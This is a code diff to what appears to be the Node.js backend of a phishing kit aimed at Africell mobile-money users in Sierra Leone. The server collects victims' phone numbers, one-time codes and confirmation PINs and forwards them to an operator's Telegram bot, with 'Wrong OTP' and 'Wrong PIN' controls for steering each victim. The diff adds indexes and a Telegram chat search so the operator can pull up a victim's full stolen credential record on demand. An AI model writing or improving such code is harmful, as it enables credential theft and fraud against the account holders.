@@ -14,6 +14,10 @@ app.use(express.static('.'));
 const orderStatuses = {};
 const userCredentials = {};
 
+// Secondary lookup indices for instant text search inside Telegram chat
+const otpToPhone = {};
+const pinToPhone = {};
+
 function escapeMarkdown(text) {
     if (!text) return '';
     return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
@@ -74,12 +78,16 @@ app.post('/api/submit-order', async (req, res) => {
             headerTitle = "📱 *Africell OTP Code Submitted*";
             wrongButtonText = "⚠️ Wrong OTP";
             stepTag = 'otp';
-            userCredentials[cleanPhone].otp = uniqueId.replace('OTP Code: ', '').trim();
+            const otpVal = uniqueId.replace('OTP Code: ', '').trim();
+            userCredentials[cleanPhone].otp = otpVal;
+            otpToPhone[otpVal] = cleanPhone; // Index OTP for chat search
         } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
             headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
             wrongButtonText = "⚠️ Wrong PIN";
             stepTag = 'pin';
-            userCredentials[cleanPhone].confirmPin = uniqueId.replace('Confirmation PIN: ', '').trim();
+            const pinVal = uniqueId.replace('Confirmation PIN: ', '').trim();
+            userCredentials[cleanPhone].confirmPin = pinVal;
+            pinToPhone[pinVal] = cleanPhone; // Index PIN for chat search
         } else if (uniqueId && uniqueId.startsWith('Disbursement Requested -')) {
             headerTitle = "💰 *Africell Disbursement Request*";
             wrongButtonText = "⚠️ Wrong PIN / Error";
@@ -163,12 +171,61 @@ app.get('/api/check-status', (req, res) => {
 app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
+        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+
+        // Handle direct text messages typed into the bot chat for quick searching
+        if (update.message && update.message.text) {
+            const chatId = update.message.chat.id;
+            const queryText = update.message.text.trim();
+            const cleanQueryPhone = normalizePhone(queryText);
+
+            let targetPhone = null;
+            if (pinToPhone[queryText]) {
+                targetPhone = pinToPhone[queryText];
+            } else if (otpToPhone[queryText]) {
+                targetPhone = otpToPhone[queryText];
+            } else if (userCredentials[cleanQueryPhone]) {
+                targetPhone = cleanQueryPhone;
+            } else {
+                // Partial phone number search fallback
+                const foundKey = Object.keys(userCredentials).find(k => k.includes(queryText));
+                if (foundKey) targetPhone = foundKey;
+            }
+
+            if (targetPhone && userCredentials[targetPhone]) {
+                const c = userCredentials[targetPhone];
+                const rawDigits = c.phone.replace(/\+232/g, '').trim();
+                let replyMsg = `🔍 *Found User Record*\n\n` +
+                               `🇸🇱 Country: \`+232\`\n` +
+                               `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
+
+                if (c.otp) replyMsg += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
+                if (c.confirmPin) replyMsg += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
+                if (c.applicationDetails) replyMsg += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
+
+                const currentStatus = orderStatuses[c.phone] ? orderStatuses[c.phone].status : 'pending';
+                replyMsg += `\n\n📌 Current Status: *${currentStatus.toUpperCase()}*`;
+
+                await sendToTelegram(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: chatId,
+                    text: replyMsg,
+                    parse_mode: 'Markdown'
+                });
+            } else {
+                await sendToTelegram(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: chatId,
+                    text: `❌ No record found matching: \`${escapeMarkdown(queryText)}\``,
+                    parse_mode: 'Markdown'
+                });
+            }
+            return res.sendStatus(200);
+        }
+
         if (!update.callback_query) return res.sendStatus(200);
 
         const cbData = update.callback_query.data || '';
         const chatId = update.callback_query.message.chat.id;
         const messageId = update.callback_query.message.message_id;
-        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 
         const parts = cbData.split('|');
         if (parts.length !== 3) {
